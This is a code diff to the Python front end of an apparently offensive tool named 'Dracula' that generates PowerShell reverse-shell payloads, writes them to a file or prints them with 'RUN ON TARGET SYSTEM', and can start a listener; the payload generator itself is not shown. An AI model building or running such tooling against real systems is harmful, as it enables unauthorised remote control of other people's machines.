@@ -2,6 +2,14 @@ import os
 import argparse
 import Main.dracula_main as main
 
+
+#COLORS INITIALIZE
+RED = "\033[0;31m"
+GREEN = "\033[0;32m"
+BV = "\033[38;5;57m"
+CYAN = "\033[38;5;69m"
+RESET = "\033[0m"
+
 def clear_screen():
     os.system('cls' if os.name == 'nt' else 'clear')
 
@@ -27,11 +35,10 @@ print_banner()
 payload_type = None
 
 while True:
-    dracula_cm = input("\033[38;5;57mDracula >> \033[0m ").split()
+    dracula_cm = input(f"{BV}Dracula >> {RESET}").split()
     if not dracula_cm:
         continue
-    
-    
+
     parser = argparse.ArgumentParser(description="Generate a reverse shell payload in form of a batch file.")
     parser.add_argument("-PORT", "--port", help="Port number for the reverse shell")
     parser.add_argument("-OUTFILE", "--output", help="Output file name")
@@ -41,13 +48,15 @@ while True:
     args = parser.parse_args(dracula_cm)
     powershell_script = main.generate_payload_ps(args.ip, args.port, args.output)
     try:
-        print(powershell_script)
-        with open(args.output, "w") as f:
-            f.write(powershell_script)
-            print(f"\n\033[38;5;69mSUCCESS!!! \033[0mCREATED {args.output} ")
+        if args.ip and args.port and args.output:
+            with open(args.output, "w") as f:
+                f.write(powershell_script)
+                print(f"\n{GREEN}SUCCESS!!! {RESET}CREATED {args.output} ")
+        elif args.ip and args.port:
+            print("PAYLOAD GENERATED, RUN ON TARGET SYSTEM: ")
+            print(powershell_script)
     except Exception as e:
-            print(f"\033[38;5;31mAn error occurred: {e}")
-            
+        print(f"{RED}An error occurred: {e}{RESET}")
 
     if args.connect and args.port and args.ip:
         print(f"Starting listener on {args.ip}:{args.port}...")
